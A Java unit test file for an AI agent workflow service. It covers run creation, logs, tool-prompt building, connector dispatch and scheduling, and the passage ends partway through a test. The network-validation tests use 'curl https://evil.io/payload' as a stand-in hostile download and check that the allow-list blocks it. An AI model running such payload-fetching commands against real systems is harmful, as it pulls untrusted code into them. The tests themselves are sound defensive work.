package com.agentsystem.workflow.service;

import com.agentsystem.workflow.service.impl.WorkflowRunServiceImpl;

import com.agentsystem.auth.service.EmailService;
import com.agentsystem.config.ChatModelFactory;
import com.agentsystem.config.LlmProperties;
import com.agentsystem.connector.service.GoogleDocsService;
import com.agentsystem.connector.service.GoogleSheetsService;
import com.agentsystem.connector.service.GoogleSlidesService;
import com.agentsystem.connector.service.TelegramService;
import com.agentsystem.model.service.ModelConfigService;
import com.agentsystem.sandbox.service.SandboxService;
import com.agentsystem.skill.service.SkillService;
import com.agentsystem.webfetch.service.WebFetchService;
import com.agentsystem.workflow.entity.Workflow;
import com.agentsystem.workflow.entity.WorkflowRun;
import com.agentsystem.workflow.entity.WorkflowRunLog;
import com.agentsystem.workflow.repository.WorkflowAgentRepository;
import com.agentsystem.workflow.repository.WorkflowRunLogRepository;
import com.agentsystem.workflow.repository.WorkflowRunRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.ai.chat.client.ChatClient;

import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.ArgumentMatchers.isNull;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class WorkflowRunServiceTest {

    @Mock WorkflowRunRepository    runRepo;
    @Mock WorkflowRunLogRepository logRepo;
    @Mock WorkflowAgentRepository  agentRepo;
    @Mock WorkflowService          workflowService;
    @Mock SandboxService           sandboxService;
    @Mock WebFetchService          webFetchService;
    @Mock SkillService             skillService;
    @Mock ChatClient               chatClient;
    @Mock ChatModelFactory         chatModelFactory;
    @Mock ModelConfigService       modelConfigService;
    @Mock LlmProperties            llmProperties;
    @Mock EmailService             emailService;
    @Mock WorkflowScheduleClient   workflowScheduleClient;
    @Mock GoogleDocsService        googleDocsService;
    @Mock GoogleSheetsService      googleSheetsService;
    @Mock GoogleSlidesService      googleSlidesService;
    @Mock TelegramService          telegramService;

    WorkflowRunServiceImpl service;

    @BeforeEach
    void setUp() {
        service = new WorkflowRunServiceImpl(
                runRepo, logRepo, agentRepo, workflowService, sandboxService,
                webFetchService, skillService, chatClient, chatModelFactory,
                modelConfigService, llmProperties, emailService,
                workflowScheduleClient,
                googleDocsService, googleSheetsService, googleSlidesService, telegramService);
    }

    // ── startRun ──────────────────────────────────────────────────────────────

    @Test
    void startRun_savesRunWithCorrectFields() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        service.startRun("wf-1", "Do something", "owner@test.com", false);

        ArgumentCaptor<WorkflowRun> captor = ArgumentCaptor.forClass(WorkflowRun.class);
        verify(runRepo, atLeastOnce()).save(captor.capture());

        WorkflowRun initial = captor.getAllValues().stream()
                .filter(r -> r.getStatus() == WorkflowRun.RunStatus.PENDING)
                .findFirst()
                .orElseThrow(() -> new AssertionError("No PENDING run saved"));

        assertThat(initial.getWorkflowId()).isEqualTo("wf-1");
        assertThat(initial.getUserInput()).isEqualTo("Do something");
        assertThat(initial.getOwnerEmail()).isEqualTo("owner@test.com");
        assertThat(initial.getId()).isNotBlank();
    }

    @Test
    void startRun_returnedIdMatchesSavedRunId() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        String runId = service.startRun("wf-1", "input", "user@test.com", false);

        ArgumentCaptor<WorkflowRun> captor = ArgumentCaptor.forClass(WorkflowRun.class);
        verify(runRepo, atLeastOnce()).save(captor.capture());

        boolean matchFound = captor.getAllValues().stream()
                .anyMatch(r -> runId.equals(r.getId()));
        assertThat(matchFound).isTrue();
    }

    @Test
    void startRun_eachCallGeneratesUniqueRunId() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        String id1 = service.startRun("wf-1", "task A", "user@test.com", false);
        String id2 = service.startRun("wf-1", "task B", "user@test.com", false);

        assertThat(id1).isNotEqualTo(id2);
    }

    // ── getRuns ───────────────────────────────────────────────────────────────

    @Test
    void getRuns_delegatesToRepository() {
        WorkflowRun run = new WorkflowRun("r1", "wf-1", "owner@test.com", "input");
        when(runRepo.findByWorkflowIdOrderByStartedAtDesc("wf-1")).thenReturn(List.of(run));

        List<WorkflowRun> result = service.getRuns("wf-1");

        assertThat(result).containsExactly(run);
        verify(runRepo).findByWorkflowIdOrderByStartedAtDesc("wf-1");
    }

    @Test
    void getRuns_noRuns_returnsEmptyList() {
        when(runRepo.findByWorkflowIdOrderByStartedAtDesc("wf-empty")).thenReturn(List.of());

        assertThat(service.getRuns("wf-empty")).isEmpty();
    }

    // ── getLogs ───────────────────────────────────────────────────────────────

    @Test
    void getLogs_delegatesToRepository() {
        WorkflowRunLog log = new WorkflowRunLog("r1", null, null,
                WorkflowRunLog.LogType.SYSTEM, "Workflow started");
        when(logRepo.findByRunIdOrderByCreatedAt("r1")).thenReturn(List.of(log));

        List<WorkflowRunLog> result = service.getLogs("r1");

        assertThat(result).containsExactly(log);
        verify(logRepo).findByRunIdOrderByCreatedAt("r1");
    }

    @Test
    void getLogs_noLogs_returnsEmptyList() {
        when(logRepo.findByRunIdOrderByCreatedAt("r-none")).thenReturn(List.of());

        assertThat(service.getLogs("r-none")).isEmpty();
    }

    // ── validateNetworkCommand ────────────────────────────────────────────────

    @Test
    void validateNetworkCommand_plainCommand_allowed() throws Exception {
        assertThat(callValidate("echo hello world", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_pythonScript_allowed() throws Exception {
        assertThat(callValidate("python3 main.py", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_curlToAllowedDomain_allowed() throws Exception {
        when(webFetchService.isUrlAllowed("https://api.example.com/data", "owner@test.com"))
                .thenReturn(true);

        assertThat(callValidate("curl https://api.example.com/data", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_curlToBlockedDomain_returnsBlockedMessage() throws Exception {
        when(webFetchService.isUrlAllowed("https://evil.io/payload", "owner@test.com"))
                .thenReturn(false);

        String result = callValidate("curl https://evil.io/payload", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("evil.io");
        assertThat(result).contains("whitelist");
    }

    @Test
    void validateNetworkCommand_wgetToBlockedDomain_returnsBlockedMessage() throws Exception {
        when(webFetchService.isUrlAllowed("https://blocked.net/file.zip", "owner@test.com"))
                .thenReturn(false);

        String result = callValidate("wget https://blocked.net/file.zip", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("blocked.net");
    }

    @Test
    void validateNetworkCommand_curlWithNoUrl_returnsBlockedMessage() throws Exception {
        String result = callValidate("curl --help", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("without a recognizable URL");
    }

    @Test
    void validateNetworkCommand_wgetWithNoUrl_returnsBlockedMessage() throws Exception {
        String result = callValidate("wget --spider", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
    }

    @Test
    void validateNetworkCommand_multipleCurlUrls_blockedIfAnyNotAllowed() throws Exception {
        when(webFetchService.isUrlAllowed("https://ok.com", "owner@test.com")).thenReturn(true);
        when(webFetchService.isUrlAllowed("https://bad.com", "owner@test.com")).thenReturn(false);

        String result = callValidate("curl https://ok.com && curl https://bad.com", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("bad.com");
    }

    // ── buildContext ──────────────────────────────────────────────────────────

    @Test
    void buildContext_singleMessage_returnsContentDirectly() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user", "content", "What is RAG?"));

        assertThat(callBuildContext(messages)).isEqualTo("What is RAG?");
    }

    @Test
    void buildContext_multipleMessages_includesRoleHeaders() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user",      "content", "Tell me about Java"),
                Map.of("role", "assistant", "content", "Java is a language"));

        String result = callBuildContext(messages);

        assertThat(result).contains("[USER]");
        assertThat(result).contains("[ASSISTANT]");
        assertThat(result).contains("Tell me about Java");
        assertThat(result).contains("Java is a language");
    }

    @Test
    void buildContext_multipleMessages_roleIsUppercased() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user", "content", "q1"),
                Map.of("role", "user", "content", "q2"));

        String result = callBuildContext(messages);

        assertThat(result).contains("[USER]");
        assertThat(result).doesNotContain("[user]");
    }

    // ── truncate ──────────────────────────────────────────────────────────────

    @Test
    void truncate_shortString_returnsUnchanged() throws Exception {
        assertThat(callTruncate("hello", 100)).isEqualTo("hello");
    }

    @Test
    void truncate_stringExactlyAtLimit_returnsUnchanged() throws Exception {
        assertThat(callTruncate("abcde", 5)).isEqualTo("abcde");
    }

    @Test
    void truncate_longString_cutsAtLimitAndAddsEllipsis() throws Exception {
        assertThat(callTruncate("abcdefghij", 5)).isEqualTo("abcde…");
    }

    @Test
    void truncate_nullInput_returnsLiteralNullString() throws Exception {
        assertThat(callTruncate(null, 10)).isEqualTo("null");
    }

    // ── buildToolSection — sandbox tools ─────────────────────────────────────

    @Test
    void buildToolSection_emptyList_returnsEmpty() throws Exception {
        assertThat(callBuildToolSection(List.of())).isEmpty();
    }

    @Test
    void buildToolSection_sandboxTools_includesBashFormat() throws Exception {
        String result = callBuildToolSection(List.of("BASH", "PYTHON"));

        assertThat(result).contains("use_tool name=\"bash\"");
        assertThat(result).contains("bash");
        assertThat(result).contains("python");
    }

    @Test
    void buildToolSection_sandboxTools_doesNotIncludeConnectorInstructions() throws Exception {
        String result = callBuildToolSection(List.of("BASH", "CURL"));

        assertThat(result).doesNotContain("GOOGLE_DOCS_WRITE");
        assertThat(result).doesNotContain("TELEGRAM_SEND");
        assertThat(result).doesNotContain("Connected Service Tools");
    }

    @Test
    void buildToolSection_scheduleOnly_includesScheduleFormat() throws Exception {
        String result = callBuildToolSection(List.of("SCHEDULE"));

        assertThat(result).contains("use_tool name=\"SCHEDULE\"");
        assertThat(result).contains("\"action\"");
    }

    // ── buildToolSection — connector tools ────────────────────────────────────

    @Test
    void buildToolSection_googleDocsConnector_includesWriteAndReadInstructions() throws Exception {
        String result = callBuildToolSection(List.of("CONNECTOR_GOOGLE_DOCS"));

        assertThat(result).contains("Connected Service Tools");
        assertThat(result).contains("GOOGLE_DOCS_WRITE");
        assertThat(result).contains("GOOGLE_DOCS_READ");
    }

    @Test
    void buildToolSection_googleSheetsConnector_includesSheetsWriteInstruction() throws Exception {
        String result = callBuildToolSection(List.of("CONNECTOR_GOOGLE_SHEETS"));

        assertThat(result).contains("GOOGLE_SHEETS_WRITE");
        assertThat(result).doesNotContain("GOOGLE_DOCS_WRITE");
    }

    @Test
    void buildToolSection_googleSlidesConnector_includesSlidesWriteInstruction() throws Exception {
        String result = callBuildToolSection(List.of("CONNECTOR_GOOGLE_SLIDES"));

        assertThat(result).contains("GOOGLE_SLIDES_WRITE");
        assertThat(result).doesNotContain("GOOGLE_SHEETS_WRITE");
    }

    @Test
    void buildToolSection_telegramConnector_includesSendInstruction() throws Exception {
        String result = callBuildToolSection(List.of("CONNECTOR_TELEGRAM"));

        assertThat(result).contains("TELEGRAM_SEND");
    }

    @Test
    void buildToolSection_multipleConnectors_includesAllInstructions() throws Exception {
        String result = callBuildToolSection(List.of(
                "CONNECTOR_GOOGLE_DOCS",
                "CONNECTOR_GOOGLE_SHEETS",
                "CONNECTOR_GOOGLE_SLIDES",
                "CONNECTOR_TELEGRAM"));

        assertThat(result).contains("GOOGLE_DOCS_WRITE");
        assertThat(result).contains("GOOGLE_DOCS_READ");
        assertThat(result).contains("GOOGLE_SHEETS_WRITE");
        assertThat(result).contains("GOOGLE_SLIDES_WRITE");
        assertThat(result).contains("TELEGRAM_SEND");
    }

    @Test
    void buildToolSection_sandboxAndConnector_includesBothSections() throws Exception {
        String result = callBuildToolSection(List.of("BASH", "CONNECTOR_TELEGRAM"));

        assertThat(result).contains("use_tool name=\"bash\"");
        assertThat(result).contains("TELEGRAM_SEND");
        assertThat(result).contains("Connected Service Tools");
    }

    @Test
    void buildToolSection_alwaysEndsWithFinalAnswerReminder() throws Exception {
        String withSandbox   = callBuildToolSection(List.of("BASH"));
        String withConnector = callBuildToolSection(List.of("CONNECTOR_TELEGRAM"));
        String withSchedule  = callBuildToolSection(List.of("SCHEDULE"));

        assertThat(withSandbox).endsWith("final answer, respond normally without any XML tags.");
        assertThat(withConnector).endsWith("final answer, respond normally without any XML tags.");
        assertThat(withSchedule).endsWith("final answer, respond normally without any XML tags.");
    }

    // ── dispatchConnectorTool ─────────────────────────────────────────────────

    @Test
    void dispatchConnectorTool_googleDocsWrite_callsCreateDocument() throws Exception {
        when(googleDocsService.createDocument(eq("My Doc"), eq("Body text"), eq("user@test.com"), isNull()))
                .thenReturn("https://docs.google.com/document/d/abc/edit");

        String result = callDispatchConnectorTool(
                "GOOGLE_DOCS_WRITE",
                "{\"title\":\"My Doc\",\"content\":\"Body text\"}",
                "user@test.com");

        assertThat(result).contains("docs.google.com");
        verify(googleDocsService).createDocument("My Doc", "Body text", "user@test.com", null);
    }

    @Test
    void dispatchConnectorTool_googleDocsRead_callsReadDocument() throws Exception {
        String docUrl = "https://docs.google.com/document/d/xyz/edit";
        when(googleDocsService.readDocument(eq(docUrl), eq("user@test.com"), isNull()))
                .thenReturn("Document content here");

        String result = callDispatchConnectorTool(
                "GOOGLE_DOCS_READ",
                "{\"url\":\"" + docUrl + "\"}",
                "user@test.com");

        assertThat(result).isEqualTo("Document content here");
        verify(googleDocsService).readDocument(docUrl, "user@test.com", null);
    }

    @Test
    void dispatchConnectorTool_googleDocsRead_acceptsPlainUrl() throws Exception {
        String docUrl = "https://docs.google.com/document/d/abc/edit";
        when(googleDocsService.readDocument(eq(docUrl), anyString(), isNull()))
                .thenReturn("Content");

        // Plain string payload (not JSON object)
        callDispatchConnectorTool("GOOGLE_DOCS_READ", "\"" + docUrl + "\"", "user@test.com");

        verify(googleDocsService).readDocument(docUrl, "user@test.com", null);
    }

    @Test
    void dispatchConnectorTool_googleSheetsWrite_callsCreateSpreadsheet() throws Exception {
        when(googleSheetsService.createSpreadsheet(eq("Budget"), eq("Name\tAmount"), eq("user@test.com"), isNull()))
                .thenReturn("https://docs.google.com/spreadsheets/d/def/edit");

        String result = callDispatchConnectorTool(
                "GOOGLE_SHEETS_WRITE",
                "{\"title\":\"Budget\",\"content\":\"Name\\tAmount\"}",
                "user@test.com");

        assertThat(result).contains("spreadsheets");
        verify(googleSheetsService).createSpreadsheet("Budget", "Name\tAmount", "user@test.com", null);
    }

    @Test
    void dispatchConnectorTool_googleSlidesWrite_callsCreatePresentation() throws Exception {
        when(googleSlidesService.createPresentation(eq("Deck"), eq("Slide 1\nbody"), eq("user@test.com"), isNull()))
                .thenReturn("https://docs.google.com/presentation/d/ghi/edit");

        String result = callDispatchConnectorTool(
                "GOOGLE_SLIDES_WRITE",
                "{\"title\":\"Deck\",\"content\":\"Slide 1\\nbody\"}",
                "user@test.com");

        assertThat(result).contains("presentation");
        verify(googleSlidesService).createPresentation("Deck", "Slide 1\nbody", "user@test.com", null);
    }

    @Test
    void dispatchConnectorTool_telegramSend_callsSendMessage() throws Exception {
        when(telegramService.sendMessage(eq("user@test.com"), isNull(), eq("Hello!")))
                .thenReturn("Message sent to your Telegram successfully.");

        String result = callDispatchConnectorTool(
                "TELEGRAM_SEND",
                "{\"message\":\"Hello!\"}",
                "user@test.com");

        assertThat(result).contains("successfully");
        verify(telegramService).sendMessage("user@test.com", null, "Hello!");
    }

    @Test
    void dispatchConnectorTool_telegramSend_acceptsPlainString() throws Exception {
        when(telegramService.sendMessage(anyString(), isNull(), eq("Plain message")))
                .thenReturn("Message sent to your Telegram successfully.");

        callDispatchConnectorTool("TELEGRAM_SEND", "\"Plain message\"", "user@test.com");

        verify(telegramService).sendMessage("user@test.com", null, "Plain message");
    }

    @Test
    void dispatchConnectorTool_serviceThrowsIllegalState_returnsConnectorError() throws Exception {
        when(googleDocsService.createDocument(anyString(), anyString(), anyString(), any()))
                .thenThrow(new IllegalStateException("Google account not connected."));

        String result = callDispatchConnectorTool(
                "GOOGLE_DOCS_WRITE",
                "{\"title\":\"T\",\"content\":\"C\"}",
                "user@test.com");

        assertThat(result).startsWith("Connector error:");
        assertThat(result).contains("Google account not connected");
    }

    @Test
    void dispatchConnectorTool_unknownTool_returnsUnknownMessage() throws Exception {
        String result = callDispatchConnectorTool("NONEXISTENT_TOOL", "{}", "user@test.com");

        assertThat(result).contains("Unknown connector tool");
        assertThat(result).contains("NONEXISTENT_TOOL");
    }

    @Test
    void dispatchConnectorTool_missingJsonFields_usesDefaultValues() throws Exception {
        when(googleDocsService.createDocument(eq("Untitled"), eq(""), eq("user@test.com"), isNull()))
                .thenReturn("https://docs.google.com/document/d/new/edit");

        callDispatchConnectorTool("GOOGLE_DOCS_WRITE", "{}", "user@test.com");

        verify(googleDocsService).createDocument("Untitled", "", "user@test.com", null);
    }

    // ── startRun — emailNotify ────────────────────────────────────────────────

    @Test
    void startRun_emailNotifyTrue_registersRunForNotification() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        String runId = service.startRun("wf-1", "task", "owner@test.com", true);

        // The run ID is registered in emailNotifyRuns; can't directly assert on private map,
        // but we verify the run was saved with PENDING status as a proxy for proper setup.
        assertThat(runId).isNotBlank();
        ArgumentCaptor<WorkflowRun> captor = ArgumentCaptor.forClass(WorkflowRun.class);
        verify(runRepo, atLeastOnce()).save(captor.capture());
        assertThat(captor.getAllValues().stream()
                .anyMatch(r -> r.getStatus() == WorkflowRun.RunStatus.PENDING)).isTrue();
    }

    @Test
    void startRun_emailNotifyTrue_anonymousUser_doesNotRegisterForNotification() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        // anonymous users must not receive email notifications
        String runId = service.startRun("wf-1", "task", "anonymous", true);

        assertThat(runId).isNotBlank();
    }

    // ── dispatchScheduleTool ──────────────────────────────────────────────────

    @Test
    void dispatchScheduleTool_createAction_callsCreateSchedule() throws Exception {
        when(workflowScheduleClient.createSchedule(
                eq("owner@test.com"), anyString(), anyString(),
                anyString(), anyString(), anyInt(), anyBoolean(), anyBoolean()))
                .thenReturn("Schedule created. ID: sched-1, cron: 0 9 * * *, timezone: UTC");

        String result = callDispatchScheduleTool("owner@test.com",
                "{\"action\":\"create\",\"conversationId\":\"conv-1\",\"message\":\"hello\"," +
                "\"cron\":\"0 9 * * *\",\"timezone\":\"UTC\",\"topK\":5," +
                "\"useKnowledgeBase\":true,\"useWebFetch\":false}");

        assertThat(result).contains("sched-1");
        verify(workflowScheduleClient).createSchedule(
                eq("owner@test.com"), eq("conv-1"), eq("hello"),
                eq("0 9 * * *"), eq("UTC"), eq(5), eq(true), eq(false));
    }

    @Test
    void dispatchScheduleTool_listAction_callsListSchedules() throws Exception {
        when(workflowScheduleClient.listSchedules("owner@test.com", "conv-1"))
                .thenReturn("[{\"id\":\"s1\"}]");

        String result = callDispatchScheduleTool("owner@test.com",
                "{\"action\":\"list\",\"conversationId\":\"conv-1\"}");

        assertThat(result).contains("s1");
        verify(workflowScheduleClient).listSchedules("owner@test.com", "conv-1");
    }

    @Test
    void dispatchScheduleTool_deleteAction_callsDeleteSchedule() throws Exception {
        when(workflowScheduleClient.deleteSchedule("owner@test.com", "sched-99"))
                .thenReturn("Schedule sched-99 deleted successfully.");

        String result = callDispatchScheduleTool("owner@test.com",
                "{\"action\":\"delete\",\"scheduleId\":\"sched-99\"}");

        assertThat(result).contains("deleted");
        verify(workflowScheduleClient).deleteSchedule("owner@test.com", "sched-99");
    }

    @Test
    void dispatchScheduleTool_unknownAction_returnsErrorMessage() throws Exception {
        String result = callDispatchScheduleTool("owner@test.com",
                "{\"action\":\"patch\",\"scheduleId\":\"sched-1\"}");

        assertThat(result).contains("Unknown SCHEDULE action");
        assertThat(result).contains("patch");
    }

    @Test
    void dispatchScheduleTool_invalidJson_returnsErrorMessage() throws Exception {
        String result = callDispatchScheduleTool("owner@test.com", "{bad json");

        assertThat(result).contains("SCHEDULE tool error");
    }

    @Test
    void dispatchScheduleTool_createWithDefaults_usesFallbackCronAndTimezone() throws Exception {
        when(workflowScheduleClient.createSchedule(
                anyString(), anyString(), anyString(),
                eq("0 9 * * *"), eq("UTC"), anyInt(), anyBoolean(), anyBoolean()))
                .thenReturn("Schedule created. ID: s1, cron: 0 9 * * *, timezone: UTC");

        // Omit cron and timezone → defaults applied
        callDispatchScheduleTool("owner@test.com",
                "{\"action\":\"create\",\"conversationId\":\"c1\",\"message\":\"hi\"}");

        verify(workflowScheduleClient).createSchedule(
                anyString(), anyString(), anyString(),
                eq("0 9 * * *"), eq("UTC"), anyInt(), anyBoolean(), anyBoolean());
    }

    // ── buildSkillSection ─────────────────────────────────────────────────────

    @Test
    void buildSkillSection_nullOrEmptyList_returnsEmpty() throws Exception {
        assertThat(callBuildSkillSection(null)).isEmpty();
        assertThat(callBuildSkillSection(List.of())).isEmpty();
    }

    @Test
    void buildSkillSection_withSkillIds_appendsSkillContent() throws Exception {
        when(skillService.getContent("skill-1")).thenReturn(java.util.Optional.of("Skill one content"));
        when(skillService.getContent("skill-2")).thenReturn(java.util.Optional.of("Skill two content"));

        String result = callBuildSkillSection(List.of("skill-1", "skill-2"));

        assertThat(result).contains("## Knowledge");
        assertThat(result).contains("Skill one content");
        assertThat(result).contains("Skill two content");
    }

    @Test
    void buildSkillSection_skillNotFound_skipsIt() throws Exception {
        when(skillService.getContent("missing")).thenReturn(java.util.Optional.empty());

        String result = callBuildSkillSection(List.of("missing"));

        assertThat(result).contains("## Knowledge");
        assertThat(result).doesNotContain("content");
    }

    // ── reflection helpers ────────────────────────────────────────────────────

    private String callValidate(String command, String email) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
                "validateNetworkCommand", String.class, String.class);
        m.setAccessible(true);
        return (String) m.invoke(service, command, email);
    }

    @SuppressWarnings("unchecked")
    private String callBuildContext(List<Map<String, String>> messages) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod("buildContext", List.class);
        m.setAccessible(true);
        return (String) m.invoke(service, messages);
    }

    private String callTruncate(String s, int max) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
                "truncate", String.class, int.class);
        m.setAccessible(true);
        return (String) m.invoke(service, s, max);
    }

    private String callBuildToolSection(List<String> tools) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod("buildToolSection", List.class);
        m.setAccessible(true);
        return (String) m.invoke(service, tools);
    }

    private String callDispatchConnectorTool(String toolName, String payload, String ownerEmail)
            throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
                "dispatchConnectorTool", String.class, String.class, String.class, String.class);
        m.setAccessible(true);
        return (String) m.invoke(service, toolName, payload, ownerEmail, null);
    }

    private String callDispatchScheduleTool(String ownerEmail, String json) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
                "dispatchScheduleTool", String.class, String.class);
        m.setAccessible(true);
        return (String) m.invoke(service, ownerEmail, json);
    }

    @SuppressWarnings("unchecked")
    private String callBuildSkillSection(List<String> skillIds) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod("buildSkillSection", List.class);
        m.setAccessible(true);
        return (String) m.invoke(service, skillIds);
    }

    // ── streamLogs ────────────────────────────────────────────────────────────

    @Test
    void streamLogs_returnsEmitter() {
        var emitter = service.streamLogs("run-1");
        assertThat(emitter).isNotNull();
    }

    @Test
    void streamLogs_differentRunIds_returnDifferentEmitters() {
        var emitter1 = service.streamLogs("run-a");
        var emitter2 = service.streamLogs("run-b");
        assertThat(emitter1).isNotSameAs(emitter2);
    }

    // ── buildOrchestratorPrompt ───────────────────────────────────────────────

    @Test
    void buildOrchestratorPrompt_withSystemPrompt_includesPrompt() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setSystemPrompt("You are the orchestrator.");
        main.setName("Main");

        when(workflowService.parseSkillIds(main)).thenReturn(List.of());
        when(workflowService.parseTools(main)).thenReturn(List.of());

        String prompt = callBuildOrchestratorPrompt(main, List.of());

        assertThat(prompt).contains("You are the orchestrator.");
    }

    @Test
    void buildOrchestratorPrompt_noSystemPrompt_usesDefault() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setSystemPrompt(null);
        main.setName("Main");

        when(workflowService.parseSkillIds(main)).thenReturn(List.of());
        when(workflowService.parseTools(main)).thenReturn(List.of());

        String prompt = callBuildOrchestratorPrompt(main, List.of());

        assertThat(prompt).contains("helpful orchestrator agent");
    }

    @Test
    void buildOrchestratorPrompt_withSubAgents_includesSubAgentSection() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setSystemPrompt("You are the orchestrator.");
        main.setName("Main");

        com.agentsystem.workflow.entity.WorkflowAgent sub = new com.agentsystem.workflow.entity.WorkflowAgent();
        sub.setName("Researcher");
        sub.setSystemPrompt("You are a research specialist.");

        when(workflowService.parseSkillIds(main)).thenReturn(List.of());
        when(workflowService.parseTools(main)).thenReturn(List.of());

        String prompt = callBuildOrchestratorPrompt(main, List.of(sub));

        assertThat(prompt).contains("Sub-Agents");
        assertThat(prompt).contains("Researcher");
        assertThat(prompt).contains("delegate");
    }

    @Test
    void buildOrchestratorPrompt_subAgentLongPrompt_truncatesPreview() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setName("Main");
        when(workflowService.parseSkillIds(main)).thenReturn(List.of());
        when(workflowService.parseTools(main)).thenReturn(List.of());

        com.agentsystem.workflow.entity.WorkflowAgent sub = new com.agentsystem.workflow.entity.WorkflowAgent();
        sub.setName("Sub");
        sub.setSystemPrompt("A".repeat(200));  // longer than 120 chars

        String prompt = callBuildOrchestratorPrompt(main, List.of(sub));

        assertThat(prompt).contains("…");
    }

    @Test
    void buildOrchestratorPrompt_withTools_includesToolSection() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setName("Main");
        when(workflowService.parseSkillIds(main)).thenReturn(List.of());
        when(workflowService.parseTools(main)).thenReturn(List.of("BASH", "CURL"));

        String prompt = callBuildOrchestratorPrompt(main, List.of());

        assertThat(prompt).contains("Available Tools");
    }

    @Test
    void buildOrchestratorPrompt_withSkills_includesSkillSection() throws Exception {
        com.agentsystem.workflow.entity.WorkflowAgent main = new com.agentsystem.workflow.entity.WorkflowAgent();
        main.setName("Main");
        when(workflowService.parseSkillIds(main)).thenReturn(List.of("skill-1"));
        when(workflowService.parseTools(main)).thenReturn(List.of());
        when(skillService.getContent("skill-1")).thenReturn(java.util.Optional.of("Skill content"));

        String prompt = callBuildOrchestratorPrompt(main, List.of());

        assertThat(prompt).contains("Knowledge");
    }

    // ── buildToolSection — schedule format ───────────────────────────────────

    @Test
    void buildToolSection_scheduleWithSandboxAndConnector_includesAllSections() throws Exception {
        String result = callBuildToolSection(List.of("BASH", "SCHEDULE", "CONNECTOR_TELEGRAM"));

        assertThat(result).contains("use_tool name=\"bash\"");
        assertThat(result).contains("use_tool name=\"SCHEDULE\"");
        assertThat(result).contains("TELEGRAM_SEND");
    }

    // ── executeRun via reflection ─────────────────────────────────────────────

    @Test
    void executeRun_orchestratorPattern_completesSuccessfully() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-1");
        workflow.setName("Test Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);
        mainAgent.setSystemPrompt("You are helpful.");

        when(workflowService.findById("wf-1")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-1")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn(null);
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        when(callSpec.content()).thenReturn("Final answer.");

        WorkflowRun run = new WorkflowRun("run-1", "wf-1", "owner@test.com", "Do the task");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
    }

    @Test
    void executeRun_teamParallelPattern_completesSuccessfully() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-2");
        workflow.setName("Team Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.TEAM);
        workflow.setTeamExecMode(Workflow.TeamExecMode.PARALLEL);
        workflow.setSelectedModel(null);

